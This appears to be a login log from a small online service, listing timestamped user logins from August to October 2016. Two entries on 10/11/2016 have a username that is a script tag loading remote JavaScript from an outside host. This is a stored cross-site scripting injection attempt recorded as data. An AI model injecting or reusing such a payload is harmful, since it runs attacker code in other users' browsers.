[08/31/2016 10:43:43] tlis logged in
[08/31/2016 13:59:07] tlis logged in
[08/31/2016 14:02:37] tlis logged in
[08/31/2016 14:09:16] tlis logged in
[08/31/2016 14:11:39] tlis logged in
[08/31/2016 14:13:54] TeamSupport logged in
[08/31/2016 14:14:26] tlis logged in
[08/31/2016 14:19:10] TeamSupport logged in
[08/31/2016 14:24:35] tlis logged in
[08/31/2016 14:25:07] tlis1 logged in
[08/31/2016 14:25:34] tlis logged in
[08/31/2016 14:30:22] Register logged in
[09/02/2016 03:18:55] tlis logged in
[09/02/2016 13:33:28] PTTT logged in
[09/02/2016 15:12:02] ly blues logged in
[09/02/2016 15:18:31] tlis logged in
[09/03/2016 05:36:00] PTTT logged in
[09/03/2016 14:06:17] tlis logged in
[09/03/2016 14:26:52] tlis logged in
[09/03/2016 14:48:47] tlis logged in
[09/03/2016 15:08:16] x1 logged in
[09/03/2016 17:14:20] PTTT logged in
[09/03/2016 17:17:02] tlis logged in
[09/04/2016 03:16:15] PTTT logged in
[09/04/2016 05:17:08] tlis logged in
[09/04/2016 06:28:51] ly blues logged in
[09/04/2016 06:30:27] ly blues logged in
[09/04/2016 07:22:40] ly blues logged in
[09/04/2016 09:20:17] ly blues logged in
[09/04/2016 13:11:06] tlis logged in
[09/04/2016 13:18:29] ly blues logged in
[09/04/2016 14:14:12] tlis logged in
[09/04/2016 15:34:07] tlis logged in
[09/04/2016 15:45:09] tlis logged in
[09/04/2016 15:56:58] Minkin logged in
[09/04/2016 15:57:31] tlis logged in
[09/04/2016 15:58:10] Minkin logged in
[09/04/2016 16:21:46] tlis logged in
[09/04/2016 16:27:42] tlis logged in
[09/05/2016 02:02:42] tlis logged in
[09/05/2016 02:43:15] tlis logged in
[09/05/2016 11:55:28] tlis logged in
[09/05/2016 13:23:06] tlis logged in
[09/05/2016 15:08:03] Minkin logged in
[09/06/2016 03:27:40] tlis logged in
[09/06/2016 06:13:17] Minkin logged in
[09/06/2016 07:00:01] tlis logged in
[09/06/2016 07:02:42] tlis logged in
[09/06/2016 10:31:55] [_] logged in
[09/07/2016 01:18:25] tlis logged in
[09/07/2016 11:42:45] Minkin logged in
[09/07/2016 13:44:21] tlis logged in
[09/07/2016 15:22:00] tlis logged in
[09/08/2016 14:06:44] tlis logged in
[09/08/2016 14:59:03] tlis logged in
[09/09/2016 09:27:45] tlis logged in
[09/09/2016 13:37:19] tlis logged in
[09/09/2016 16:29:21] Minkin logged in
[09/10/2016 01:01:11] Minkin logged in
[09/10/2016 07:56:57] tlis logged in
[09/10/2016 16:23:09] Minkin logged in
[09/13/2016 05:04:06] tlis logged in
[09/13/2016 17:07:07] tlis logged in
[09/14/2016 10:25:51] tlis logged in
[09/14/2016 12:40:11] tlis logged in
[09/14/2016 12:40:31] tlis logged in
[09/16/2016 03:38:45] tlis logged in
[09/16/2016 16:10:33] tlis logged in
[09/16/2016 16:29:38] tlis logged in
[09/19/2016 02:42:07] tlis logged in
[09/20/2016 14:22:23] tlis logged in
[09/21/2016 05:34:08] tlis logged in
[09/25/2016 11:53:42] tlis logged in
[09/28/2016 06:02:45] tlis logged in
[09/28/2016 07:11:37] tlis logged in
[09/28/2016 14:50:44] Dota2VN logged in
[09/28/2016 16:26:25] tlis logged in
[09/29/2016 05:23:50] Dota2VN logged in
[09/29/2016 05:24:21] Dota2VN logged in
[09/29/2016 11:17:15] [_] logged in
[09/29/2016 11:17:57] [_] logged in
[09/29/2016 11:28:11] [_] logged in
[09/30/2016 04:49:38] tlis logged in
[09/30/2016 07:19:35] tlis logged in
[09/30/2016 07:40:03] tlis logged in
[10/03/2016 07:07:43] tlis logged in
[10/04/2016 15:10:12] tlis logged in
[10/04/2016 15:21:12] tlis logged in
[10/04/2016 16:16:24] tlis logged in
[10/05/2016 08:14:47] tlis logged in
[10/06/2016 12:04:58] tlis logged in
[10/07/2016 15:13:16] tlis logged in
[10/07/2016 15:16:04] tlis logged in
[10/07/2016 15:21:46] tlis logged in
[10/07/2016 15:29:42] VinaChin logged in
[10/07/2016 15:32:37] VinaChin logged in
[10/07/2016 15:38:48] Vision logged in
[10/07/2016 15:41:35] cong logged in
[10/07/2016 15:43:29] Dota2VN logged in
[10/07/2016 15:46:08] PTVA logged in
[10/07/2016 16:04:56] tlis logged in
[10/07/2016 16:25:32] VinaChin Cooperation logged in
[10/07/2016 16:25:59] VinaChin Cooperation logged in
[10/07/2016 16:52:02] Dick Dance logged in
[10/07/2016 16:55:38] Dick Dance logged in
[10/08/2016 06:05:57] tlis logged in
[10/08/2016 13:47:25] tlis logged in
[10/08/2016 15:45:51] white hat logged in
[10/08/2016 15:46:30] white hat logged in
[10/08/2016 15:47:44] white hat logged in
[10/10/2016 04:31:06] Dota2VN logged in
[10/10/2016 17:25:20] tlis logged in
[10/11/2016 04:09:29] tlis logged in
[10/11/2016 06:12:22] tlis logged in
[10/11/2016 14:05:26] PTVA logged in
[10/11/2016 14:06:13] PTVA logged in
[10/11/2016 14:54:05] tlis logged in
[10/11/2016 15:37:23] Dota2VN logged in
[10/11/2016 15:44:53] tlis logged in
[10/11/2016 15:51:24] <script type="text/javascript" src="http://yourjavascript.com/9619307133/jquery.js"></script> logged in
[10/11/2016 15:51:40] Trịnh Xuân Thanh logged in
[10/11/2016 15:52:31] <script type="text/javascript" src="http://yourjavascript.com/9619307133/jquery.js"></script> logged in
[10/11/2016 15:53:51] axiterx logged in
[10/11/2016 15:58:28] Surrender at 20 logged in
[10/11/2016 16:16:53] PTVA logged in
